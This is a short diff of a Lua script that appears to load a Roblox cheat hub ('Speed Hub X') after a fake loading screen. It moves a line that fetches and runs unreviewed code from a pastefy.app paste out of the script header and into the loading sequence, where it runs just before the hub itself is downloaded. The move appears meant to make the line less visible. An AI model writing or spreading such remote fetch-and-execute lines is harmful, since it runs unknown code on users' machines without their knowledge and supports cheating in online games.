@@ -1,5 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
---// Delta Executor Detection
+
 --// Delta Executor Detection
 local function isDelta()
     local deltaIdentifiers = {
@@ -119,6 +118,7 @@ else
     label.Text = "Speed Hub Loading..."
     task.wait(1.5)
     loadingUI:Destroy()
+    loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
 end
 
